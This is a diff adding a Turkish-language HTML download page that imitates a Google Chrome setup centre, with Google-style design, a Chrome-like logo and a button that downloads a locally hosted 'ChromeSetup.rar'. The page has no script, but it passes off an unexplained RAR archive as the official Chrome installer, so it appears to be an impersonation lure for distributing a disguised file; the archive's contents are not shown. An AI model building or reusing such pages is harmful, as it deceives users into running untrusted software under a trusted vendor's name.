@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Chrome Kurulum Merkezi</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: #f8f9fa;
+            color: #202124;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+            max-width: 480px;
+            width: 100%;
+            padding: 40px 30px;
+            text-align: center;
+        }
+        .chrome-logo {
+            width: 72px;
+            height: 72px;
+            margin-bottom: 24px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: #202124;
+        }
+        p {
+            font-size: 15px;
+            line-height: 1.6;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+        .btn-download {
+            display: inline-block;
+            background-color: #1a73e8;
+            color: #ffffff;
+            padding: 14px 32px;
+            font-size: 16px;
+            font-weight: 500;
+            text-decoration: none;
+            border-radius: 24px;
+            box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
+            transition: background-color 0.2s, box-shadow 0.2s;
+        }
+        .btn-download:hover {
+            background-color: #1557b0;
+            box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 2px 6px 2px rgba(60,64,67,0.15);
+        }
+        .file-info {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #f1f3f4;
+            font-size: 13px;
+            color: #70757a;
+            text-align: left;
+        }
+        .file-info-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+        .file-info-label {
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Sade ve modern tasarım için entegre SVG Chrome Logosu -->
+    <svg class="chrome-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#4285F4" d="M50 31.2c10.4 0 19.8 4 26.8 10.6l19.5-19.5C84.3 10.3 68.3 3 50 3 24.9 3 3.6 20.3 0 43.6l24.7 19.1C30.6 44.9 39.3 31.2 50 31.2z"/>
+        <path fill="#34A853" d="M50 68.8c-10.4 0-19.8-4-26.8-10.6L3.7 77.7C15.7 89.7 31.7 97 50 97c25.1 0 46.4-17.3 50-40.6H74.7c-5.9 17.8-14.6 12.4-24.7 12.4z"/>
+        <path fill="#FBBC05" d="M23.2 58.2c-1.1-3.3-1.7-6.8-1.7-10.4 0-3.6.6-7.1 1.7-10.4L0 18.3C0 27.2 4.1 35.3 10.7 41.8C15.2 46.3 21.1 52.7 23.2 58.2z"/>
+        <path fill="#EA4335" d="M100 50c0 10.1-2.9 19.5-8 27.6L67.3 58.5c5.1-5.1 8-12.1 8-19.7 0-3.6-.6-7.1-1.7-10.4H100c1.1 3.3 1.7 6.8 1.7 10.4c0 3.6-.6 7.1-1.7 10.4z"/>
+        <circle fill="#FFFFFF" cx="50" cy="50" r="22.2"/>
+        <circle fill="#4285F4" cx="50" cy="50" r="15.6"/>
+    </svg>
+
+    <h1>Google Chrome'u İndirin</h1>
+    <p>İnternet gezintinizi daha hızlı, güvenli ve kişiselleştirilmiş hale getirin. Kurulum dosyasını hemen indirerek başlayın.</p>
+    
+    <!-- Yüklediğiniz ChromeSetup.rar dosyasının bağlantısı -->
+    <a href="ChromeSetup.rar" class="btn-download" download>
+        Kurulum Dosyasını İndir
+    </a>
+
+    <div class="file-info">
+        <div class="file-info-item">
+            <span class="file-info-label">Dosya Adı:</span>
+            <span>ChromeSetup.rar</span>
+        </div>
+        <div class="file-info-item">
+            <span class="file-info-label">Platform:</span>
+            <span>Windows (64-bit / 32-bit)</span>
+        </div>
+        <div class="file-info-item">
+            <span class="file-info-label">Sürüm:</span>
+            <span>En Güncel Sürüm</span>
+        </div>
+    </div>
+</div>
+
+</body>
+</html>
